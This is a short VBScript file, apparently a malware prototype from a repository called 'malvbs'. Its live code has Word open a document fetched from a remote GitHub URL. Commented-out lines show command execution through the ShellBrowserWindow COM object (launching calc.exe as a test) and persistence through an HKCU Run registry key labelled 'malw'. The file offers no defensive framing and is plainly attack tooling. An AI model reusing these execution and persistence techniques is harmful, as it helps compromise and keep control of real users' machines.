'Set IE = CreateObject("InternetExplorer.Application")
'IE.Visible = True
'IE.Navigate "https://image.ceneostatic.pl/data/products/49235798/i-lego-worlds-gra-pc.jpg"

Set wrdApp = CreateObject("Word.Application")
Set wrdDoc = wrdApp.Documents.Open("https://github.com/nukeduk/malvbs/edit/master/putty.txt")
wrdApp.Visible = True

'Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
'obj.Document.Application.ShellExecute "calc.exe",Null,"C:\Windows\System32",Null,0

'Set WshShell = CreateObject("WScript.Shell")
'WshShell.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\malw", "tujestmalware", "REG_SZ"
